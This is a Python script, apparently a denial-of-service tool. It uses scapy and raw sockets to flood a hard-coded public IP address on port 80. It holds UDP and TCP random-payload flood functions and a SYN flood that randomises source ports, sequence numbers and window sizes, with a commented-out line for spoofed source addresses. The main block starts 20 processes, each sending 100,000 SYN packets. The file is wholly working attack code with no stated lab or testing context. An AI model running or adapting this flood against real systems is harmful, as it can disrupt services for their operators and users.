from scapy.all import *

import random
import socket
import multiprocessing
import time
import os
import sys


print("-- Start --")
ip = "20.240.223.158"
dstIP = "20.240.223.158"
dstPort = 80
counter = 100000
port = 80
times = 10
threads = 20


def udp(t):
	data = random._urandom(1024)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		addr = (str(ip),int(port))
		for x in range(times):
			s.sendto(data,addr)
			print("thread_" + str(t) + "_times_" + str(x) + " UDP Sent!!!")
	except:
		print("[!] Error!!!")

def tcp(t):
	data = random._urandom(1024000)
	try:
		start = time.time()
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ip,port))
		for x in range(times):
			s.send(data)
			print("PID_" + str(os.getpid()) +  "_thread_" + str(t) + "_times_" + str(x) + " [tcp] Sent!!!")
		print("***send time(sec) :", time.time() - start)
	except:
		s.close()
		print("[tcp] Error")


def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1000,9000)
	return x	

def SYN_Flood(dstIP,dstPort,counter):
	start = time.time()
	total = 0
	print ("Packets are sending ...")
	for x in range (0,counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		#IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP ()	
		TCP_Packet.sport = s_port
		TCP_Packet.dport = dstPort
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)
		total+=1
	sys.stdout.write("\nTotal packets sent: %i\n" % total)
	print("*** PID " + str(os.getpid()) + " run time(sec) :", time.time() - start)


start = time.time()

if __name__ == "__main__":
    processes = []
    for i in range(0, threads):
        #process = multiprocessing.Process(target=tcp, args=(i,))
        process = multiprocessing.Process(target=SYN_Flood, args=(dstIP, dstPort, counter))
        processes.append(process)
        process.start()
    for process in processes:
        process.join()
print("***overall run time(sec) :", time.time() - start)
